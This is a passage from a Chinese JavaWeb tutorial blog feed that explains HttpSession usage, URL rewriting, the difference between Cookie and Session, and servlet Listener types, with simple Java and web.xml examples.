<h1 id="三、Session"><a href="#三、Session" class="headerlink" title="三、Session"></a>三、Session</h1><h2 id="1-Session基本原理及使用"><a href="#1-Session基本原理及使用" class="headerlink" title="1. Session基本原理及使用"></a>1. Session基本原理及使用</h2><blockquote>
<ul>
<li><code>Session</code>：服务端会话技术，将数据保存到服务端。</li>
<li>本质上：Session技术就是一种基于后端有别于数据库的临时存储技术。</li>
<li>JavaEE提供<code>HttpSession</code>接口，来实现一次会话的多次请求间数据共享功能。</li>
</ul>
</blockquote>
<ul>
<li>Session的常用实现有两种方式：</li>
</ul>
<p> <strong>① 基于<code>Cookie</code></strong></p>
<blockquote>
<p>客户端第一次发送请求时，服务器会创建一个Session，同时创建的特殊Cookie（key为<code>JSESSIONID</code>，value为一个<code>唯一</code>的<code>Session的id</code>），然后将该Cookie发送至客户端。Session保存在服务器端，为防止内存溢出，服务器会把长时间内没有活跃的Session从内存<code>删除</code>。这个时间就是Session的<code>超时时间</code>。如果超过了超时时间没访问过服务器，Session就自动失效了。</p>
</blockquote>
<p><strong>②<code>URL重写</code></strong></p>
<blockquote>
<p>URL地址重写是对客户端<code>不支持</code>Cookie的解决方案。URL地址重写的原理是将该用户<code>Session的id</code>信息重写到URL地址中。服务器能够解析重写后的URL获取Session的id。这样即使客户端不支持Cookie，也可以使用Session来记录用户状态。<br>&#x3D;&#x3D;HttpServletResponse类提供了两个URL地址重写的方法&#x3D;&#x3D;：</p>
<ul>
<li><code>encodeURL(String url)</code>：用于对表单action和超链接的url地址进行重写</li>
<li><code>encodeRedirectURL(String url)</code>：用于对<code>sendRedirect</code>方法后的url地址进行重写<br></li>
</ul>
<p>这两个方法会<code>自动判断</code>该浏览器是否支持Cookie，如果支持Cookie，重写后的URL地址就不会带有<code>JSESSIONID</code>了【即使浏览器支持Cookie，第一次输出URL地址时仍然会出现<code>JSESSIONID</code>（因为没有任何Cookie可带）】</p>
</blockquote>
<p><strong>URL重写测试代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	<span class="comment">// 获取 session 对象</span></span><br><span class="line">	<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">	<span class="comment">// 获取URL</span></span><br><span class="line">	<span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> String.valueOf(request.getRequestURL());</span><br><span class="line">	<span class="comment">// URL 重写</span></span><br><span class="line">	url = response.encodeURL(url);</span><br><span class="line">	<span class="comment">// 存储 数据</span></span><br><span class="line">	session.setAttribute(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;划水艺术家&quot;</span>);</span><br><span class="line">	<span class="comment">// 请求转发</span></span><br><span class="line">	response.sendRedirect(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可在<code>第一次</code>在URL重写后，将<code>JSESSSIONID</code>返给前端，前端在以后的每次请求都携带上JSESSSIONID。</p>
</blockquote>
<ul>
<li><strong>Session的工作原理（基于Cookie）</strong></li>
</ul>
<blockquote>
<p>① 客户端第一次发送请求到服务器端，服务器端创建一个Session，同时会创建一个特殊的Cookie（key为<code>JSESSIONID</code>，value为一个<code>唯一</code>的<code>Session的id</code>），然后将该Cookie发送至客户端。<br><br>② 客户端发送第N（N&gt;1）次请求到服务端，客户会携带该key为<code>JSESSIONID</code>的Cookie对象。<br><br>③ 服务端再次接收到来自客户端的请求时，会先去检查是否存在SessionID，不存在就新建一个SessionID并重复1，2的流程；如果存在就去遍历服务端的session文件，找到与这个SessionID相对应的文件，确定当前用户信息。此后的请求都会交换这个 SessionID，进行有状态的会话。</p>
</blockquote>
<ul>
<li><strong>Session使用：</strong></li>
</ul>
<p>①获取Session对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br></pre></td></tr></table></figure>
<p>②Session对象功能</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 存储数据到Session域中</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setAttribute</span><span class="params">(String key, Object o)</span>;</span><br><span class="line"><span class="comment">// 根据key，获取值</span></span><br><span class="line">Object <span class="title function_">gettAttribute</span><span class="params">(String key)</span>;</span><br><span class="line"><span class="comment">// 根据key，删除该键值对</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">removeAttribute</span><span class="params">(String key)</span>;</span><br></pre></td></tr></table></figure>
<p><strong>测试代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	<span class="comment">// 存储数据到 session</span></span><br><span class="line">	<span class="comment">// 1. 获取 session 对象</span></span><br><span class="line">	<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">	<span class="comment">// 2. 存储 数据</span></span><br><span class="line">	session.setAttribute(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;划水艺术家&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	<span class="comment">// 从 session 获取数据</span></span><br><span class="line">	<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">	<span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) session.getAttribute(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-关于Session"><a href="#2-关于Session" class="headerlink" title="2. 关于Session"></a>2. 关于Session</h2><h3 id="Session钝化、活化"><a href="#Session钝化、活化" class="headerlink" title="Session钝化、活化"></a>Session钝化、活化</h3><blockquote>
<p>① <strong>钝化</strong>：在服务器正常关闭后，Tomcat会自动将Session数据写入硬盘文件<br>② <strong>活化</strong>：再次启动服务器后，从文件中加载数据到Session</p>
</blockquote>
<hr>
<h3 id="Session销毁"><a href="#Session销毁" class="headerlink" title="Session销毁"></a>Session销毁</h3><p>①默认情况，无操作，30分钟自动销毁（自动销毁为防止内存溢出），可在<code>web.xml</code>配置或使用<code>setMaxInactiveInterval(int time)</code>设置。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>30<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">	<span class="comment">// 设置超时时间</span></span><br><span class="line">	session.setMaxInactiveInterval(<span class="number">30</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>②调用Session对象的<code>invalidate()</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">	<span class="comment">// 销毁</span></span><br><span class="line">	session.invalidate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Session常用API"><a href="#Session常用API" class="headerlink" title="Session常用API"></a>Session常用API</h3><blockquote>
<p><strong><code>以下API均由 Session 对象操作</code></strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置 Session 属性</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setAttribute</span><span class="params">(String key, Object <span class="keyword">var</span>)</span></span><br><span class="line"><span class="comment">// 获取 Session 属性</span></span><br><span class="line">Object <span class="title function_">getAttribute</span><span class="params">(String key)</span></span><br><span class="line"><span class="comment">// 删除 Session 属性</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">removeAttribute</span><span class="params">(String key)</span></span><br><span class="line"><span class="comment">// 销毁 Session</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">invalidate</span><span class="params">()</span></span><br><span class="line"><span class="comment">// 获取 Session 创建时间</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">getCreationTime</span><span class="params">()</span></span><br><span class="line"><span class="comment">// 获取 Session 的id</span></span><br><span class="line">String <span class="title function_">getId</span><span class="params">()</span></span><br><span class="line"><span class="comment">// 获取 Session 最后活跃的时间</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">getLastAccessedTime</span><span class="params">()</span></span><br><span class="line"><span class="comment">// 设置 Session 超时时间</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setMaxInactiveInterval</span><span class="params">(<span class="type">int</span> var1)</span></span><br><span class="line"><span class="comment">// 获取 Session 超时时间</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getMaxInactiveInterval</span><span class="params">()</span></span><br><span class="line"><span class="comment">// 判断该 Session 是否为新建</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">isNew</span><span class="params">()</span></span><br></pre></td></tr></table></figure>

<h1 id="四、Cookie与Session总结"><a href="#四、Cookie与Session总结" class="headerlink" title="四、Cookie与Session总结"></a>四、Cookie与Session总结</h1><ul>
<li>Cookie与Session都是为完成一次会话内多次请求间<code>数据共享</code>。<br><strong>两者区别对比：</strong></li>
</ul>
<blockquote>
<ul>
<li><code> 存储位置</code>：Cookie将数据存储在客户端；Session将数据存储在服务端 </li>
<li><code>存储容量</code>：Cookie最大&#x3D;&#x3D;4KB&#x3D;&#x3D;；Session无大小限制</li>
<li><code>存储时间</code>：Cookie可长期存储；Session默认&#x3D;&#x3D;30分钟&#x3D;&#x3D; </li>
<li><code>存储方式</code>：Cookie只能存储&#x3D;&#x3D;ASCII字符&#x3D;&#x3D;，存储&#x3D;&#x3D;unicode字符&#x3D;&#x3D;需要编码；Session能存储&#x3D;&#x3D;任何类型&#x3D;&#x3D;数据，包括但不限于String、Integer、List、Map等。</li>
<li><code>安全性</code>：Cookie不安全；Session安全</li>
<li><code>服务器性能</code>：Cookie不占服务器资源；Session占用服务器资源</li>
<li><code>存活时间</code>：Cookie是按&#x3D;&#x3D;累积时间&#x3D;&#x3D;计算生命周期；Session周期指的是&#x3D;&#x3D;不活动&#x3D;&#x3D;的时间，若设置Session超时时间是10s，在10s内，没有访问Session，Session中属性失效，如果在9s的时候，访问了Session，则会重新计时</li>
<li><code>跨域名</code>：Cookie可以设置&#x3D;&#x3D;domain&#x3D;&#x3D;属性来实现跨域名；Session只在当前的域名内有效，不可跨域名</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-Listener介绍</title>
    <url>/posts/91f012d1.html</url>
    <content><![CDATA[<h1 id="一、Listener介绍"><a href="#一、Listener介绍" class="headerlink" title="一、Listener介绍"></a>一、Listener介绍</h1><ul>
<li>概念：Listener 表示监听器，是JavaWeb三大组件（<a href="https://blog.csdn.net/qq_51938362/article/details/125703691?spm=1001.2014.3001.5502">Servlet</a>、<a href="https://blog.csdn.net/qq_51938362/article/details/125742422?spm=1001.2014.3001.5502">Filter</a>、Listener）之一。</li>
<li>监听器可以监听在<code>application</code>，<code>Session</code>，<code>Request</code>三个对象创建、销毁或者往其中添加修改删除属性时&#x3D;&#x3D;自动&#x3D;&#x3D;执行代码的功能组件。</li>
<li>Listener分类：JavaWeb共提供了8个类型的监听器。</li>
<li>作用：监听某个事件的发生，状态的改变。</li>
<li>内部机制：接口<code>回调</code>。</li>
</ul>
<table>
    <tr>
        <th>监听器分类</th>
        <th>监听器名称</th>
        <th>作用 </th>  
    </tr > 
    <tr >
        <td rowspan="2">ServletContext监听</b</td>
        <td>ServletContextListener</td>
        <td>用于对ServletContext对象进行监听（创建、销毁） </td>
    </tr>
    <tr>
        <td>ServletContextAttributeListener</td>
        <td>对ServletContext对象中属性的监听（增删改）</td>
    </tr>
    <tr >
        <td rowspan="4">Session监听</td>
        <td>HttpSessionListener</td>
        <td>对Session对象的整体状态的监听（创建、销毁） </td>
    </tr>
    <tr>
        <td>HttpSessionAttributeListener</td>
        <td>对Session对象中的属性监听（增删改）</td>
    </tr>
    <tr>
        <td >HttpSessionBindingListener</td>
        <td >监听对象于Session的绑定和解除</td>
    </tr>
    <tr>
        <td >HttpSessionActivationListener</td>
        <td >对Session数据的钝化和活化的监听</td>
    </tr>
        <td rowspan="2">Request监听</td>
        <td>ServletRequestListener</td>
        <td>对Request对象进行监听（创建、销毁） </td>
    <tr>
        <td >ServletRequestAttributeListener</td>
        <td >对Request对象中属性的监听（增删改）</td>
    </tr>
</table>

<p><strong>实现监听：</strong></p>
<p><strong>① 创建类实现监听器接口<br>② web.xml文件中配置(注册）监听器</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>自定义监听器类的全限定名称<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<p>例如：<br><strong>自定义一个<code>MyHttpSessionListener</code> 监听器</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tyt.listener;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 实现HttpSessionListener接口，</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyHttpSessionListener</span> <span class="keyword">implements</span> <span class="title class_">HttpSessionListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//当一个用户打开网站的时候开启创建session执行的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionCreated</span><span class="params">(HttpSessionEvent httpSessionEvent)</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//关闭网站的时候销毁session执行的的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionDestroyed</span><span class="params">(HttpSessionEvent httpSessionEvent)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>web.xml配置文件相应监听器映射如下：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--监听映射--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>com.tyt.listener.MyHttpSessionListener <span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> <strong>Servlet3.0后可以通过注解<code>@WebListener</code> 注册监听器</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tyt.listener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyHttpSessionListener</span> <span class="keyword">implements</span> <span class="title class_">HttpSessionListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//当一个用户打开网站的时候开启创建session执行的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionCreated</span><span class="params">(HttpSessionEvent httpSessionEvent)</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//关闭网站的时候销毁session执行的的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionDestroyed</span><span class="params">(HttpSessionEvent httpSessionEvent)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="二、Listener监听三个域对象创建与销毁"><a href="#二、Listener监听三个域对象创建与销毁" class="headerlink" title="二、Listener监听三个域对象创建与销毁"></a>二、Listener监听三个域对象创建与销毁</h1><table>
<thead>
<tr>
<th align="left">监听器分类</th>
<th align="left">监听器名称</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ServletContext监听</td>
<td align="left"><code>ServletContextListener</code></td>
</tr>
<tr>
<td align="left">Session监听</td>
<td align="left"><code>HttpSessionListener</code></td>
</tr>
<tr>
<td align="left">Request监听</td>
<td align="left"><code>ServletRequestListener</code></td>
</tr>
</tbody></table>
<h2 id="1-监听ServletContext域对象的创建与销毁"><a href="#1-监听ServletContext域对象的创建与销毁" class="headerlink" title="1. 监听ServletContext域对象的创建与销毁"></a>1. 监听ServletContext域对象的创建与销毁</h2><p><strong>自定义类，实现<code>ServletContextListener</code></strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyServletContextListener</span> <span class="keyword">implements</span> <span class="title class_">ServletContextListener</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent arg0)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;context init...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextDestroyed</span><span class="params">(ServletContextEvent arg0)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;context destroy...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>ServletContext域对象的生命周期：</strong><br><code>创建</code>：启动服务器时创建<br><code>销毁</code>：关闭服务器或者从服务器移除项目</li>
</ul>
<hr>
<ul>
<li><strong>作用：</strong><br>利用<code>ServletContextListener</code>监听器在创建<code>ServletContext</code>域对象时完成一些想要初始化的工作或者执行自定义任务调度。<br>如：加载配置文件，在Spring框架中可定义<code>ContextLoaderListener</code></li>
</ul>
</blockquote>
<hr>
<h2 id="2-监听ServletRequest域对象的创建与销毁"><a href="#2-监听ServletRequest域对象的创建与销毁" class="headerlink" title="2. 监听ServletRequest域对象的创建与销毁"></a>2. 监听ServletRequest域对象的创建与销毁</h2><p><strong>自定义类，实现<code>ServletRequestListener</code></strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyServletRequestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent arg0)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;request init...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent arg0)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;request destroy...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>ServletRequest域对象的生命周期：</strong><br><code>创建</code>：客户端向服务端发送请求<br><code>销毁</code>：服务器为该次请求做出响应</li>
</ul>
</blockquote>
<hr>
<h2 id="3-监听HttpSession域对象的创建与销毁"><a href="#3-监听HttpSession域对象的创建与销毁" class="headerlink" title="3. 监听HttpSession域对象的创建与销毁"></a>3. 监听HttpSession域对象的创建与销毁</h2><p><strong>自定义类，实现<code>HttpSessionListener</code></strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyHttpSessionListener</span> <span class="keyword">implements</span> <span class="title class_">HttpSessionListener</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionCreated</span><span class="params">(HttpSessionEvent se)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;session creat...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionDestroyed</span><span class="params">(HttpSessionEvent se)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;session destroy...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>HttpSession域对象的生命周期：</strong><br><code>创建</code>：服务器中无session对象并调用getSession()方法<br><code>销毁</code>：<br>① session过期(默认为30分钟)<br>② <code>session.invalidate()</code>，手动销毁<br>③ <code>非正常</code>关闭服务器(正常关闭会序列化到硬盘)</li>
</ul>
<hr>
<ul>
<li><strong>作用：</strong><br>每位用户登录网站时都会创建一个HttpSession对象，利用这个统计在线人数。</li>
</ul>
</blockquote>
<h1 id="三、Listener监听三个域对象属性状态的改变"><a href="#三、Listener监听三个域对象属性状态的改变" class="headerlink" title="三、Listener监听三个域对象属性状态的改变"></a>三、Listener监听三个域对象属性状态的改变</h1><table>
<thead>
<tr>
<th align="left">监听器分类</th>
<th align="left">监听器名称</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ServletContext监听</td>
<td align="left"><code>ServletContextAttributeListener</code></td>
</tr>
<tr>
<td align="left">Session监听</td>
<td align="left"><code>HttpSessionAttributeListener</code></td>
</tr>
<tr>
<td align="left">Request监听</td>
<td align="left"><code>ServletRequestAttributeListener</code></td>
</tr>
</tbody></table>
<blockquote>
<p><strong>监听三个域对象属性状态的改变（属性添加、替换、移除）</strong></p>
</blockquote>
<h2 id="1-监听ServletContext域对象的属性状态改变"><a href="#1-监听ServletContext域对象的属性状态改变" class="headerlink" title="1. 监听ServletContext域对象的属性状态改变"></a>1. 监听ServletContext域对象的属性状态改变</h2><p><strong>监听器代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyServletContextAttributeListener</span> <span class="keyword">implements</span> <span class="title class_">ServletContextAttributeListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attributeAdded</span><span class="params">(ServletContextAttributeEvent servletContextAttributeEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;servletContext attribute add...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attributeRemoved</span><span class="params">(ServletContextAttributeEvent servletContextAttributeEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;servletContext attribute remove...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attributeReplaced</span><span class="params">(ServletContextAttributeEvent servletContextAttributeEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;servletContext attribute replace...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>测试代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">	<span class="comment">// ServletContext域对象新加属性</span></span><br><span class="line">	context.setAttribute(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;tyt&quot;</span>);</span><br><span class="line">	<span class="comment">// ServletContext域对象替换属性</span></span><br><span class="line">	context.setAttribute(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;划水艺术家&quot;</span>);</span><br><span class="line">	<span class="comment">// ServletContext域对象移除属性</span></span><br><span class="line">	context.removeAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-监听ServletRequest域对象的属性状态改变"><a href="#2-监听ServletRequest域对象的属性状态改变" class="headerlink" title="2. 监听ServletRequest域对象的属性状态改变"></a>2. 监听ServletRequest域对象的属性状态改变</h2><p><strong>监听器代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyHttpSessionAttributeListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestAttributeListener</span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attributeAdded</span><span class="params">(ServletRequestAttributeEvent servletRequestAttributeEvent)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;servletRequest attribute add...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attributeRemoved</span><span class="params">(ServletRequestAttributeEvent servletRequestAttributeEvent)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;servletRequest attribute remove...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attributeReplaced</span><span class="params">(ServletRequestAttributeEvent servletRequestAttributeEvent)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;servletRequest attribute replace...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>测试代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">	<span class="comment">// HttpSession域对象新增属性</span></span><br><span class="line">	session.setAttribute(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;tyt&quot;</span>);</span><br><span class="line">	<span class="comment">// HttpSession域对象替换属性</span></span><br><span class="line">	session.setAttribute(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;划水艺术家&quot;</span>);</span><br><span class="line">	<span class="comment">// HttpSession域对象移除属性</span></span><br><span class="line">	session.removeAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-监听HttpSession域对象的属性状态改变"><a href="#3-监听HttpSession域对象的属性状态改变" class="headerlink" title="3. 监听HttpSession域对象的属性状态改变"></a>3. 监听HttpSession域对象的属性状态改变</h2><p><strong>监听器代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyHttpSessionAttributeListener</span> <span class="keyword">implements</span> <span class="title class_">HttpSessionAttributeListener</span> &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attributeAdded</span><span class="params">(HttpSessionBindingEvent httpSessionBindingEvent)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;httpSession attribute add...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title 